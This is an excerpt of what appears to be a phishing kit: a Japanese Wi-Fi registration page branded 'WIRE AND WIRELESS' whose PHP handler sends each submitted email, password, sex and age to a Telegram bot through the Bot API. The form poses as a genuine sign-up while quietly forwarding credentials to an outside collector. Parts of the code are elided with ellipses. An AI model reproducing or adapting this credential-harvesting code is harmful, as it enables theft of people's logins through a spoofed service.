...
if (isset($_POST['mail'])) {
	if ($_POST['mail'] == 'a@b' && $_POST['pass'] == 'c') {
		...
		file_get_contents('https://api.telegram.org/bot' . $token . '/sendMessage?chat_id='
			...
			. urlencode('[REGIST] MAIL：' . $_POST['mail'] .  '， PASS：' . $_POST['pass'] .  '， SEX：' . $_POST['sex'] .  '， AGE：' . $_POST['age']));
	}
...
function input_chg() {
	document.getElementById('msg').innerHTML = '新規登録して下さい<br />';
...
<body>
	...
	<form action="" method="post" onsubmit="return post()">
		...
		<div style="max-width:600px;margin:auto">
			パスワード
			<input type="password" id="pass" name="pass" placeholder="Password" style="width:100%;margin-bottom:15px" onfocus="input_chg()" />
		</div>
		<div style="max-width:600px;margin:auto">
			性別
			<select id="sex" name="sex" style="width:100%;margin-bottom:15px">
		...
		<div style="max-width:600px;margin:auto">
			年齢
			<select id="age" name="age" style="width:100%;margin-bottom:15px">
				<option value="－">選択して下さい</option>
...
Copyright © WIRE AND WIRELESS All rights reserved.
		...
		<br />
		<br />
		<input type="submit" id="submit" value="同意して登録" style="width:55%;margin:0 auto 0 auto;padding:10px;" />
	</form>
</body>
</html>
